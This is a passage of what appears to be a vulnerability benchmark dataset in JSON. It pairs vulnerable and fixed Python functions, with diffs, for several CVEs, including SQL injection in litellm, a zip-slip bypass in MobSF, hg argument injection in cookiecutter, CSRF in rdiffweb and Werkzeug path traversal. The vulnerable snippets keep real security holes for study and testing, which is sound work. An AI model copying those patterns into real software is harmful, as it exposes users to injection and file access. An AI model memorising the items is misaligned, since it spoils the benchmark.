        "snippet": "def connections_test(args) -> None:\n    \"\"\"Test an Airflow connection.\"\"\"\n    console = AirflowConsole()\n    if conf.get(\"core\", \"test_connection\", fallback=\"Disabled\").lower().strip() != \"enabled\":\n        console.print(\n            \"[bold yellow]\\nTesting connections is disabled in Airflow configuration. \"\n            \"Contact your deployment admin to enable it.\\n\"\n        )\n        raise SystemExit(1)\n\n    print(f\"Retrieving connection: {args.conn_id!r}\")\n    try:\n        conn = BaseHook.get_connection(args.conn_id)\n    except AirflowNotFoundException:\n        console.print(\"[bold yellow]\\nConnection not found.\\n\")\n        raise SystemExit(1)\n\n    print(\"\\nTesting...\")\n    status, message = conn.test_connection()\n    if status is True:\n        console.print(\"[bold green]\\nConnection success!\\n\")\n    else:\n        console.print(f\"[bold][red]\\nConnection failed![/bold]\\n{message}\\n\")"
      },
      {
        "id": "fix_py_332_3",
        "commit": "e4c3ecf8ceaefa17525b495e4bcb5b2f41309603",
        "file_path": "airflow/www/extensions/init_jinja_globals.py",
        "start_line": 57,
        "end_line": 88,
        "snippet": "    def prepare_jinja_globals():\n        extra_globals = {\n            \"server_timezone\": server_timezone,\n            \"default_ui_timezone\": default_ui_timezone,\n            \"hostname\": hostname,\n            \"navbar_color\": conf.get(\"webserver\", \"NAVBAR_COLOR\"),\n            \"log_fetch_delay_sec\": conf.getint(\"webserver\", \"log_fetch_delay_sec\", fallback=2),\n            \"log_auto_tailing_offset\": conf.getint(\"webserver\", \"log_auto_tailing_offset\", fallback=30),\n            \"log_animation_speed\": conf.getint(\"webserver\", \"log_animation_speed\", fallback=1000),\n            \"state_color_mapping\": STATE_COLORS,\n            \"airflow_version\": airflow_version,\n            \"git_version\": git_version,\n            \"k8s_or_k8scelery_executor\": IS_K8S_OR_K8SCELERY_EXECUTOR,\n            \"rest_api_enabled\": False,\n            \"config_test_connection\": conf.get(\"core\", \"test_connection\", fallback=\"Disabled\"),\n        }\n\n        backends = conf.get(\"api\", \"auth_backends\")\n        if len(backends) > 0 and backends[0] != \"airflow.api.auth.backend.deny_all\":\n            extra_globals[\"rest_api_enabled\"] = True\n\n        if \"analytics_tool\" in conf.getsection(\"webserver\"):\n            extra_globals.update(\n                {\n                    \"analytics_tool\": conf.get(\"webserver\", \"ANALYTICS_TOOL\"),\n                    \"analytics_id\": conf.get(\"webserver\", \"ANALYTICS_ID\"),\n                }\n            )\n\n        return extra_globals\n\n    app.context_processor(prepare_jinja_globals)"
      }
    ],
    "vul_patch": "--- a/airflow/api_connexion/endpoints/connection_endpoint.py\n+++ b/airflow/api_connexion/endpoints/connection_endpoint.py\n@@ -6,6 +6,13 @@\n     env var, as some hook classes tries to find out the conn from their __init__ method & errors out\n     if not found. It also deletes the conn id env variable after the test.\n     \"\"\"\n+    if conf.get(\"core\", \"test_connection\", fallback=\"Disabled\").lower().strip() != \"enabled\":\n+        return Response(\n+            \"Testing connections is disabled in Airflow configuration. Contact your deployment admin to \"\n+            \"enable it.\",\n+            403,\n+        )\n+\n     body = request.json\n     transient_conn_id = get_random_string()\n     conn_env_var = f\"{CONN_ENV_PREFIX}{transient_conn_id.upper()}\"\n\n--- a/airflow/cli/commands/connection_command.py\n+++ b/airflow/cli/commands/connection_command.py\n@@ -1,6 +1,12 @@\n def connections_test(args) -> None:\n     \"\"\"Test an Airflow connection.\"\"\"\n     console = AirflowConsole()\n+    if conf.get(\"core\", \"test_connection\", fallback=\"Disabled\").lower().strip() != \"enabled\":\n+        console.print(\n+            \"[bold yellow]\\nTesting connections is disabled in Airflow configuration. \"\n+            \"Contact your deployment admin to enable it.\\n\"\n+        )\n+        raise SystemExit(1)\n \n     print(f\"Retrieving connection: {args.conn_id!r}\")\n     try:\n\n--- a/airflow/www/extensions/init_jinja_globals.py\n+++ b/airflow/www/extensions/init_jinja_globals.py\n@@ -12,6 +12,7 @@\n             \"git_version\": git_version,\n             \"k8s_or_k8scelery_executor\": IS_K8S_OR_K8SCELERY_EXECUTOR,\n             \"rest_api_enabled\": False,\n+            \"config_test_connection\": conf.get(\"core\", \"test_connection\", fallback=\"Disabled\"),\n         }\n \n         backends = conf.get(\"api\", \"auth_backends\")\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-5225",
    "cve_description": "An SQL Injection vulnerability exists in the berriai/litellm repository, specifically within the `/global/spend/logs` endpoint. The vulnerability arises due to improper neutralization of special elements used in an SQL command. The affected code constructs an SQL query by concatenating an unvalidated `api_key` parameter directly into the query, making it susceptible to SQL Injection if the `api_key` contains malicious data. This issue affects the latest version of the repository. Successful exploitation of this vulnerability could lead to unauthorized access, data manipulation, exposure of confidential information, and denial of service (DoS).",
    "cwe_info": {
      "CWE-89": {
        "name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
        "description": "The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component. Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data."
      }
    },
    "repo": "https://github.com/BerriAI/litellm",
    "patch_url": [
      "https://github.com/BerriAI/litellm/commit/f75c15d6cd535aa78014378ad532de1df6be2f56"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_288_1",
        "commit": "1ec2ba1",
        "file_path": "litellm/proxy/proxy_server.py",
        "start_line": 8663,
        "end_line": 8709,
        "snippet": "@router.get(\n    \"/global/spend/logs\",\n    tags=[\"Budget & Spend Tracking\"],\n    dependencies=[Depends(user_api_key_auth)],\n)\nasync def global_spend_logs(\n    api_key: str = fastapi.Query(\n        default=None,\n        description=\"API Key to get global spend (spend per day for last 30d). Admin-only endpoint\",\n    )\n):\n    \"\"\"\n    [BETA] This is a beta endpoint. It will change.\n\n    Use this to get global spend (spend per day for last 30d). Admin-only endpoint\n\n    More efficient implementation of /spend/logs, by creating a view over the spend logs table.\n    \"\"\"\n    global prisma_client\n    if prisma_client is None:\n        raise ProxyException(\n            message=\"Prisma Client is not initialized\",\n            type=\"internal_error\",\n            param=\"None\",\n            code=status.HTTP_500_INTERNAL_SERVER_ERROR,\n        )\n    if api_key is None:\n        sql_query = \"\"\"SELECT * FROM \"MonthlyGlobalSpend\" ORDER BY \"date\";\"\"\"\n\n        response = await prisma_client.db.query_raw(query=sql_query)\n\n        return response\n    else:\n        sql_query = (\n            \"\"\"\n            SELECT * FROM \"MonthlyGlobalSpendPerKey\"\n            WHERE \"api_key\" = '\"\"\"\n            + api_key\n            + \"\"\"'\n            ORDER BY \"date\";\n        \"\"\"\n        )\n\n        response = await prisma_client.db.query_raw(query=sql_query)\n\n        return response\n    return"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_288_1",
        "commit": "f75c15d6cd535aa78014378ad532de1df6be2f56",
        "file_path": "litellm/proxy/proxy_server.py",
        "start_line": 8663,
        "end_line": 8705,
        "snippet": "@router.get(\n    \"/global/spend/logs\",\n    tags=[\"Budget & Spend Tracking\"],\n    dependencies=[Depends(user_api_key_auth)],\n)\nasync def global_spend_logs(\n    api_key: str = fastapi.Query(\n        default=None,\n        description=\"API Key to get global spend (spend per day for last 30d). Admin-only endpoint\",\n    )\n):\n    \"\"\"\n    [BETA] This is a beta endpoint. It will change.\n\n    Use this to get global spend (spend per day for last 30d). Admin-only endpoint\n\n    More efficient implementation of /spend/logs, by creating a view over the spend logs table.\n    \"\"\"\n    global prisma_client\n    if prisma_client is None:\n        raise ProxyException(\n            message=\"Prisma Client is not initialized\",\n            type=\"internal_error\",\n            param=\"None\",\n            code=status.HTTP_500_INTERNAL_SERVER_ERROR,\n        )\n    if api_key is None:\n        sql_query = \"\"\"SELECT * FROM \"MonthlyGlobalSpend\" ORDER BY \"date\";\"\"\"\n\n        response = await prisma_client.db.query_raw(query=sql_query)\n\n        return response\n    else:\n        sql_query = \"\"\"\n            SELECT * FROM \"MonthlyGlobalSpendPerKey\"\n            WHERE \"api_key\" = $1\n            ORDER BY \"date\";\n            \"\"\"\n\n        response = await prisma_client.db.query_raw(sql_query, api_key)\n\n        return response\n    return\n"
      }
    ],
    "vul_patch": "--- a/litellm/proxy/proxy_server.py\n+++ b/litellm/proxy/proxy_server.py\n@@ -31,17 +31,13 @@\n \n         return response\n     else:\n-        sql_query = (\n+        sql_query = \"\"\"\n+            SELECT * FROM \"MonthlyGlobalSpendPerKey\"\n+            WHERE \"api_key\" = $1\n+            ORDER BY \"date\";\n             \"\"\"\n-            SELECT * FROM \"MonthlyGlobalSpendPerKey\"\n-            WHERE \"api_key\" = '\"\"\"\n-            + api_key\n-            + \"\"\"'\n-            ORDER BY \"date\";\n-        \"\"\"\n-        )\n \n-        response = await prisma_client.db.query_raw(query=sql_query)\n+        response = await prisma_client.db.query_raw(sql_query, api_key)\n \n         return response\n     return\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-43399",
    "cve_description": "Mobile Security Framework (MobSF) is a pen-testing, malware analysis and security assessment framework capable of performing static and dynamic analysis. Before 4.0.7, there is a flaw in the Static Libraries analysis section. Specifically, during the extraction of .a extension files, the measure intended to prevent Zip Slip attacks is improperly implemented. Since the implemented measure can be bypassed, the vulnerability allows an attacker to extract files to any desired location within the server running MobSF. This vulnerability is fixed in 4.0.7.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/MobSF/Mobile-Security-Framework-MobSF",
    "patch_url": [
      "https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/cc625fe8430f3437a473e82aa2966d100a4dc883"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_363_1",
        "commit": "5b7c5c00751da45282a9a39ad65c86beadf73b18",
        "file_path": "mobsf/StaticAnalyzer/views/common/shared_func.py",
        "start_line": 178,
        "end_line": 226,
        "snippet": "def ar_extract(checksum, src, dst):\n    \"\"\"Extract AR archive.\"\"\"\n    msg = 'Extracting static library archive'\n    logger.info(msg)\n    append_scan_status(checksum, msg)\n    try:\n        ar = arpy.Archive(src)\n        ar.read_all_headers()\n        for a, val in ar.archived_files.items():\n            # Handle archive slip attacks\n            filtered = a.decode(\n                'utf-8', 'ignore').replace(\n                '../', '').replace('..\\\\', '')\n            out = Path(dst) / filtered\n            out.write_bytes(val.read())\n    except Exception:\n        # Possibly dealing with Fat binary, needs Mac host\n        msg = 'Failed to extract .a archive'\n        logger.warning(msg)\n        append_scan_status(checksum, msg)\n        # Use os ar utility\n        plat = platform.system()\n        os_err = 'Possibly a Fat binary. Requires MacOS for Analysis'\n        if plat == 'Windows':\n            logger.warning(os_err)\n            append_scan_status(checksum, os_err)\n            return\n        msg = 'Using OS ar utility to handle archive'\n        logger.info(msg)\n        append_scan_status(checksum, msg)\n        exp = ar_os(src, dst)\n        if len(exp) > 3 and plat == 'Linux':\n            # Can't convert FAT binary in Linux\n            logger.warning(os_err)\n            append_scan_status(checksum, os_err)\n            return\n        if b'lipo(1)' in exp:\n            msg = 'Fat binary archive identified'\n            logger.info(msg)\n            append_scan_status(checksum, msg)\n            # Fat binary archive\n            try:\n                nw_src = lipo_thin(checksum, src, dst)\n                if nw_src:\n                    ar_os(nw_src, dst)\n            except Exception as exp:\n                msg = 'Failed to thin fat archive'\n                logger.exception(msg)\n                append_scan_status(checksum, msg, repr(exp))"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_363_1",
        "commit": "cc625fe8430f3437a473e82aa2966d100a4dc883",
        "file_path": "mobsf/StaticAnalyzer/views/common/shared_func.py",
        "start_line": 179,
        "end_line": 230,
        "snippet": "def ar_extract(checksum, src, dst):\n    \"\"\"Extract AR archive.\"\"\"\n    msg = 'Extracting static library archive'\n    logger.info(msg)\n    append_scan_status(checksum, msg)\n    try:\n        ar = arpy.Archive(src)\n        ar.read_all_headers()\n        for a, val in ar.archived_files.items():\n            # Handle archive slip attacks\n            filtered = a.decode('utf-8', 'ignore')\n            if is_path_traversal(filtered):\n                msg = f'Zip slip detected. skipped extracting {filtered}'\n                logger.warning(msg)\n                append_scan_status(checksum, msg)\n                continue\n            out = Path(dst) / filtered\n            out.write_bytes(val.read())\n    except Exception:\n        # Possibly dealing with Fat binary, needs Mac host\n        msg = 'Failed to extract .a archive'\n        logger.warning(msg)\n        append_scan_status(checksum, msg)\n        # Use os ar utility\n        plat = platform.system()\n        os_err = 'Possibly a Fat binary. Requires MacOS for Analysis'\n        if plat == 'Windows':\n            logger.warning(os_err)\n            append_scan_status(checksum, os_err)\n            return\n        msg = 'Using OS ar utility to handle archive'\n        logger.info(msg)\n        append_scan_status(checksum, msg)\n        exp = ar_os(src, dst)\n        if len(exp) > 3 and plat == 'Linux':\n            # Can't convert FAT binary in Linux\n            logger.warning(os_err)\n            append_scan_status(checksum, os_err)\n            return\n        if b'lipo(1)' in exp:\n            msg = 'Fat binary archive identified'\n            logger.info(msg)\n            append_scan_status(checksum, msg)\n            # Fat binary archive\n            try:\n                nw_src = lipo_thin(checksum, src, dst)\n                if nw_src:\n                    ar_os(nw_src, dst)\n            except Exception as exp:\n                msg = 'Failed to thin fat archive'\n                logger.exception(msg)\n                append_scan_status(checksum, msg, repr(exp))"
      }
    ],
    "vul_patch": "--- a/mobsf/StaticAnalyzer/views/common/shared_func.py\n+++ b/mobsf/StaticAnalyzer/views/common/shared_func.py\n@@ -8,9 +8,12 @@\n         ar.read_all_headers()\n         for a, val in ar.archived_files.items():\n             # Handle archive slip attacks\n-            filtered = a.decode(\n-                'utf-8', 'ignore').replace(\n-                '../', '').replace('..\\\\', '')\n+            filtered = a.decode('utf-8', 'ignore')\n+            if is_path_traversal(filtered):\n+                msg = f'Zip slip detected. skipped extracting {filtered}'\n+                logger.warning(msg)\n+                append_scan_status(checksum, msg)\n+                continue\n             out = Path(dst) / filtered\n             out.write_bytes(val.read())\n     except Exception:\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-24065",
    "cve_description": "The package cookiecutter before 2.1.1 are vulnerable to Command Injection via hg argument injection. When calling the cookiecutter function from Python code with the checkout parameter, it is passed to the hg checkout command in a way that additional flags can be set. The additional flags can be used to perform a command injection.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/cookiecutter/cookiecutter",
    "patch_url": [
      "https://github.com/cookiecutter/cookiecutter/commit/fdffddb31fd2b46344dfa317531ff155e7999f77"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_42_1",
        "commit": "94036d0",
        "file_path": "cookiecutter/vcs.py",
        "start_line": 57,
        "end_line": 121,
        "snippet": "def clone(repo_url, checkout=None, clone_to_dir='.', no_input=False):\n    \"\"\"Clone a repo to the current directory.\n\n    :param repo_url: Repo URL of unknown type.\n    :param checkout: The branch, tag or commit ID to checkout after clone.\n    :param clone_to_dir: The directory to clone to.\n                         Defaults to the current directory.\n    :param no_input: Suppress all user prompts when calling via API.\n    :returns: str with path to the new directory of the repository.\n    \"\"\"\n    # Ensure that clone_to_dir exists\n    clone_to_dir = os.path.expanduser(clone_to_dir)\n    make_sure_path_exists(clone_to_dir)\n\n    # identify the repo_type\n    repo_type, repo_url = identify_repo(repo_url)\n\n    # check that the appropriate VCS for the repo_type is installed\n    if not is_vcs_installed(repo_type):\n        msg = f\"'{repo_type}' is not installed.\"\n        raise VCSNotInstalled(msg)\n\n    repo_url = repo_url.rstrip('/')\n    repo_name = os.path.split(repo_url)[1]\n    if repo_type == 'git':\n        repo_name = repo_name.split(':')[-1].rsplit('.git')[0]\n        repo_dir = os.path.normpath(os.path.join(clone_to_dir, repo_name))\n    if repo_type == 'hg':\n        repo_dir = os.path.normpath(os.path.join(clone_to_dir, repo_name))\n    logger.debug(f'repo_dir is {repo_dir}')\n\n    if os.path.isdir(repo_dir):\n        clone = prompt_and_delete(repo_dir, no_input=no_input)\n    else:\n        clone = True\n\n    if clone:\n        try:\n            subprocess.check_output(  # nosec\n                [repo_type, 'clone', repo_url],\n                cwd=clone_to_dir,\n                stderr=subprocess.STDOUT,\n            )\n            if checkout is not None:\n                subprocess.check_output(  # nosec\n                    [repo_type, 'checkout', checkout],\n                    cwd=repo_dir,\n                    stderr=subprocess.STDOUT,\n                )\n        except subprocess.CalledProcessError as clone_error:\n            output = clone_error.output.decode('utf-8')\n            if 'not found' in output.lower():\n                raise RepositoryNotFound(\n                    'The repository {} could not be found, '\n                    'have you made a typo?'.format(repo_url)\n                )\n            if any(error in output for error in BRANCH_ERRORS):\n                raise RepositoryCloneFailed(\n                    'The {} branch of repository {} could not found, '\n                    'have you made a typo?'.format(checkout, repo_url)\n                )\n            logger.error('git clone failed with error: %s', output)\n            raise\n\n    return repo_dir"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_42_1",
        "commit": "fdffddb",
        "file_path": "cookiecutter/vcs.py",
        "start_line": 57,
        "end_line": 125,
        "snippet": "def clone(repo_url, checkout=None, clone_to_dir='.', no_input=False):\n    \"\"\"Clone a repo to the current directory.\n\n    :param repo_url: Repo URL of unknown type.\n    :param checkout: The branch, tag or commit ID to checkout after clone.\n    :param clone_to_dir: The directory to clone to.\n                         Defaults to the current directory.\n    :param no_input: Suppress all user prompts when calling via API.\n    :returns: str with path to the new directory of the repository.\n    \"\"\"\n    # Ensure that clone_to_dir exists\n    clone_to_dir = os.path.expanduser(clone_to_dir)\n    make_sure_path_exists(clone_to_dir)\n\n    # identify the repo_type\n    repo_type, repo_url = identify_repo(repo_url)\n\n    # check that the appropriate VCS for the repo_type is installed\n    if not is_vcs_installed(repo_type):\n        msg = f\"'{repo_type}' is not installed.\"\n        raise VCSNotInstalled(msg)\n\n    repo_url = repo_url.rstrip('/')\n    repo_name = os.path.split(repo_url)[1]\n    if repo_type == 'git':\n        repo_name = repo_name.split(':')[-1].rsplit('.git')[0]\n        repo_dir = os.path.normpath(os.path.join(clone_to_dir, repo_name))\n    if repo_type == 'hg':\n        repo_dir = os.path.normpath(os.path.join(clone_to_dir, repo_name))\n    logger.debug(f'repo_dir is {repo_dir}')\n\n    if os.path.isdir(repo_dir):\n        clone = prompt_and_delete(repo_dir, no_input=no_input)\n    else:\n        clone = True\n\n    if clone:\n        try:\n            subprocess.check_output(  # nosec\n                [repo_type, 'clone', repo_url],\n                cwd=clone_to_dir,\n                stderr=subprocess.STDOUT,\n            )\n            if checkout is not None:\n                checkout_params = [checkout]\n                # Avoid Mercurial \"--config\" and \"--debugger\" injection vulnerability\n                if repo_type == \"hg\":\n                    checkout_params.insert(0, \"--\")\n                subprocess.check_output(  # nosec\n                    [repo_type, 'checkout', *checkout_params],\n                    cwd=repo_dir,\n                    stderr=subprocess.STDOUT,\n                )\n        except subprocess.CalledProcessError as clone_error:\n            output = clone_error.output.decode('utf-8')\n            if 'not found' in output.lower():\n                raise RepositoryNotFound(\n                    f'The repository {repo_url} could not be found, '\n                    'have you made a typo?'\n                )\n            if any(error in output for error in BRANCH_ERRORS):\n                raise RepositoryCloneFailed(\n                    f'The {checkout} branch of repository '\n                    f'{repo_url} could not found, have you made a typo?'\n                )\n            logger.error('git clone failed with error: %s', output)\n            raise\n\n    return repo_dir"
      }
    ],
    "vul_patch": "--- a/cookiecutter/vcs.py\n+++ b/cookiecutter/vcs.py\n@@ -42,8 +42,12 @@\n                 stderr=subprocess.STDOUT,\n             )\n             if checkout is not None:\n+                checkout_params = [checkout]\n+                # Avoid Mercurial \"--config\" and \"--debugger\" injection vulnerability\n+                if repo_type == \"hg\":\n+                    checkout_params.insert(0, \"--\")\n                 subprocess.check_output(  # nosec\n-                    [repo_type, 'checkout', checkout],\n+                    [repo_type, 'checkout', *checkout_params],\n                     cwd=repo_dir,\n                     stderr=subprocess.STDOUT,\n                 )\n@@ -51,13 +55,13 @@\n             output = clone_error.output.decode('utf-8')\n             if 'not found' in output.lower():\n                 raise RepositoryNotFound(\n-                    'The repository {} could not be found, '\n-                    'have you made a typo?'.format(repo_url)\n+                    f'The repository {repo_url} could not be found, '\n+                    'have you made a typo?'\n                 )\n             if any(error in output for error in BRANCH_ERRORS):\n                 raise RepositoryCloneFailed(\n-                    'The {} branch of repository {} could not found, '\n-                    'have you made a typo?'.format(checkout, repo_url)\n+                    f'The {checkout} branch of repository '\n+                    f'{repo_url} could not found, have you made a typo?'\n                 )\n             logger.error('git clone failed with error: %s', output)\n             raise\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2022-24065:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/cookiecutter\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2022-24065/bin/python -m pytest tests/vcs/test_clone.py::test_clone_should_invoke_vcs_command -p no:warning --disable-warnings\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2022-24065:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/cookiecutter\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2022-24065/bin/python -m pytest tests/vcs/test_clone.py -k \"not test_clone_should_invoke_vcs_command\" -p no:warning --disable-warnings\n"
  },
  {
    "cve_id": "CVE-2022-3221",
    "cve_description": "Cross-Site Request Forgery (CSRF) in GitHub repository ikus060/rdiffweb prior to 2.4.3.",
    "cwe_info": {
      "CWE-352": {
        "name": "Cross-Site Request Forgery (CSRF)",
        "description": "The web application does not, or cannot, sufficiently verify whether a request was intentionally provided by the user who sent the request, which could have originated from an unauthorized actor. "
      }
    },
    "repo": "https://github.com/ikus060/rdiffweb",
    "patch_url": [
      "https://github.com/ikus060/rdiffweb/commit/9125f5a2d918fed0f3fc1c86fa94cd1779ed9f73"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_436_1",
        "commit": "73a369a",
        "file_path": "rdiffweb/controller/pref_sshkeys.py",
        "start_line": "110",
        "end_line": "131",
        "snippet": "    def render_prefs_panel(self, panelid, action=None, **kwargs):  # @UnusedVariable\n\n        # Handle action\n        form = SshForm()\n        if action == \"add\":\n            self._add_key(action, form)\n        elif action == 'delete':\n            self._delete_key(action, DeleteSshForm())\n\n        # Get SSH keys if file exists.\n        params = {'form': form}\n        try:\n            params[\"sshkeys\"] = [\n                {'title': key.comment or (key.keytype + ' ' + key.key[:18]), 'fingerprint': key.fingerprint}\n                for key in self.app.currentuser.authorizedkeys\n            ]\n        except IOError:\n            params[\"sshkeys\"] = []\n            flash(_(\"Failed to get SSH keys\"), level='error')\n            _logger.warning(\"error reading SSH keys\", exc_info=1)\n\n        return \"prefs_sshkeys.html\", params"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_436_1",
        "commit": "9125f5a2d918fed0f3fc1c86fa94cd1779ed9f73",
        "file_path": "rdiffweb/controller/pref_sshkeys.py",
        "start_line": "110",
        "end_line": "132",
        "snippet": "    def render_prefs_panel(self, panelid, action=None, **kwargs):  # @UnusedVariable\n\n        # Handle action\n        form = SshForm()\n        delete_form = DeleteSshForm()\n        if action == \"add\" and form.is_submitted():\n            self._add_key(action, form)\n        elif action == 'delete' and delete_form.is_submitted():\n            self._delete_key(action, DeleteSshForm())\n\n        # Get SSH keys if file exists.\n        params = {'form': form}\n        try:\n            params[\"sshkeys\"] = [\n                {'title': key.comment or (key.keytype + ' ' + key.key[:18]), 'fingerprint': key.fingerprint}\n                for key in self.app.currentuser.authorizedkeys\n            ]\n        except IOError:\n            params[\"sshkeys\"] = []\n            flash(_(\"Failed to get SSH keys\"), level='error')\n            _logger.warning(\"error reading SSH keys\", exc_info=1)\n\n        return \"prefs_sshkeys.html\", params"
      }
    ],
    "vul_patch": "--- a/rdiffweb/controller/pref_sshkeys.py\n+++ b/rdiffweb/controller/pref_sshkeys.py\n@@ -2,9 +2,10 @@\n \n         # Handle action\n         form = SshForm()\n-        if action == \"add\":\n+        delete_form = DeleteSshForm()\n+        if action == \"add\" and form.is_submitted():\n             self._add_key(action, form)\n-        elif action == 'delete':\n+        elif action == 'delete' and delete_form.is_submitted():\n             self._delete_key(action, DeleteSshForm())\n \n         # Get SSH keys if file exists.\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-49766",
    "cve_description": "Werkzeug is a Web Server Gateway Interface web application library. On Python < 3.11 on Windows, os.path.isabs() does not catch UNC paths like //server/share. Werkzeug's safe_join() relies on this check, and so can produce a path that is not safe, potentially allowing unintended access to data. Applications using Python >= 3.11, or not using Windows, are not vulnerable. Werkzeug version 3.0.6 contains a patch.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/pallets/werkzeug",
    "patch_url": [
      "https://github.com/pallets/werkzeug/commit/2767bcb10a7dd1c297d812cc5e6d11a474c1f092"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_114_1",
        "commit": "50cfeeb",
        "file_path": "src/werkzeug/security.py",
        "start_line": 131,
        "end_line": 161,
        "snippet": "def safe_join(directory: str, *pathnames: str) -> str | None:\n    \"\"\"Safely join zero or more untrusted path components to a base\n    directory to avoid escaping the base directory.\n\n    :param directory: The trusted base directory.\n    :param pathnames: The untrusted path components relative to the\n        base directory.\n    :return: A safe path, otherwise ``None``.\n    \"\"\"\n    if not directory:\n        # Ensure we end up with ./path if directory=\"\" is given,\n        # otherwise the first untrusted part could become trusted.\n        directory = \".\"\n\n    parts = [directory]\n\n    for filename in pathnames:\n        if filename != \"\":\n            filename = posixpath.normpath(filename)\n\n        if (\n            any(sep in filename for sep in _os_alt_seps)\n            or os.path.isabs(filename)\n            or filename == \"..\"\n            or filename.startswith(\"../\")\n        ):\n            return None\n\n        parts.append(filename)\n\n    return posixpath.join(*parts)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_114_1",
        "commit": "2767bcb",
        "file_path": "src/werkzeug/security.py",
        "start_line": 131,
        "end_line": 163,
        "snippet": "def safe_join(directory: str, *pathnames: str) -> str | None:\n    \"\"\"Safely join zero or more untrusted path components to a base\n    directory to avoid escaping the base directory.\n\n    :param directory: The trusted base directory.\n    :param pathnames: The untrusted path components relative to the\n        base directory.\n    :return: A safe path, otherwise ``None``.\n    \"\"\"\n    if not directory:\n        # Ensure we end up with ./path if directory=\"\" is given,\n        # otherwise the first untrusted part could become trusted.\n        directory = \".\"\n\n    parts = [directory]\n\n    for filename in pathnames:\n        if filename != \"\":\n            filename = posixpath.normpath(filename)\n\n        if (\n            any(sep in filename for sep in _os_alt_seps)\n            or os.path.isabs(filename)\n            # ntpath.isabs doesn't catch this on Python < 3.11\n            or filename.startswith(\"/\")\n            or filename == \"..\"\n            or filename.startswith(\"../\")\n        ):\n            return None\n\n        parts.append(filename)\n\n    return posixpath.join(*parts)"
      }
    ],
    "vul_patch": "--- a/src/werkzeug/security.py\n+++ b/src/werkzeug/security.py\n@@ -21,6 +21,8 @@\n         if (\n             any(sep in filename for sep in _os_alt_seps)\n             or os.path.isabs(filename)\n+            # ntpath.isabs doesn't catch this on Python < 3.11\n+            or filename.startswith(\"/\")\n             or filename == \"..\"\n             or filename.startswith(\"../\")\n         ):\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2020-36768",
    "cve_description": "A vulnerability was found in rl-institut NESP2 Initial Release/1.0. It has been classified as critical. Affected is an unknown function of the file app/database.py. The manipulation leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. The patch is identified as 07c0cdf36cf6a4345086d07b54423723a496af5e. It is recommended to apply a patch to fix this issue. VDB-246642 is the identifier assigned to this vulnerability.",
    "cwe_info": {
      "CWE-89": {
        "name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
        "description": "The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component. Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data."
      }
    },
    "repo": "https://github.com/rl-institut/NESP2",
    "patch_url": [
      "https://github.com/rl-institut/NESP2/commit/07c0cdf36cf6a4345086d07b54423723a496af5e"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_208_1",
